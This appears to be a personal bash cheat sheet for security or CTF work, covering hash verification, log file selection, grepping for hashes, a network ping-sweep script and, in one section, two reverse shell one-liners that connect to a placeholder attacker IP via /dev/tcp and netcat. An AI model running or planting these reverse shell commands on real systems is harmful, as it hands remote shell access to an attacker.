# bash

### diff a file hash with its published value

`diff <(shasum -a 256 /path/to/file.ext) <(echo "published_sha256_value")`

use something like `... | sed 's/ .*$//'` to strip the extraneous info from the shasum cmd. Add info to the end of the published value to test.

`diff <(shasum -a 256 /path/to/file.ext | sed 's/ .*$//') <(echo "published_sha256_value")`

### carve a range of files by exact beginning and end

`ls -lh | grep "some_logs.log" | grep -E "1[3-9].gz|2[0-6].gz"`

Lists only `some_logs_13.gz` to `some_logs_26.gz`. Pipe that into whatever to do whatever.

### find hashes (hex) from output

`grep -a [a-f0-9]\{32\}`

Pipe output from things like `strings` here to finds hashes. The above will work for all hashes that are 32 characters or greater (md5, sha256, etc). Not perfect; will catch any string that matches the pattern, not just hashes. Adapt as needed. To find sha256 you could do

`grep -a [a-f0-9]\{64\}`

### reverse shell

`bash -i >& /dev/tcp/<attacker ip>/<listening port> 0>&1`

or if no `-e`

`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f`

### do things to entires in IPs.txt
`for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt`

### ippsec's scanner
```bash
#!/bin/bash
# by Ippsec https://www.youtube.com/watch?v=kE36IGAU5rg

for i in $(seq 2 225); do
    ping -c 1 -W 1 172.20.0.$i 1>/dev/null 2>&1
    if [[ $? -eq 0 ]];  then
          echo "172.20.0.$i - Online"
    fi
done
```
